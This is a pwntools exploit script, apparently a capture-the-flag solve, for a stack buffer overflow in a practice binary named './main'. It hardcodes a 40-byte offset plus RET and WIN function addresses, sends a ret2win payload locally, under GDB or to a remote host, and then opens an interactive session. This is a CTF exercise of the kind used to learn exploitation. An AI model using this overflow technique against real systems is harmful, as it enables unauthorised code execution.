from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *vuln+94
continue
""".format(
    **locals()
)

# Binary filename
exe = "./main"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
WIN = 0x00000000004011F6
RET = 0x000000000040101A
offset = 40

# Start program
io = start()

# Build the payload
payload = flat({offset: [RET, WIN]})

# Send the payload
io.sendlineafter(b"text/plain", payload)

# Got Shell?
io.interactive()

#with open("solve", "wb") as f:
#   f.write(payload)
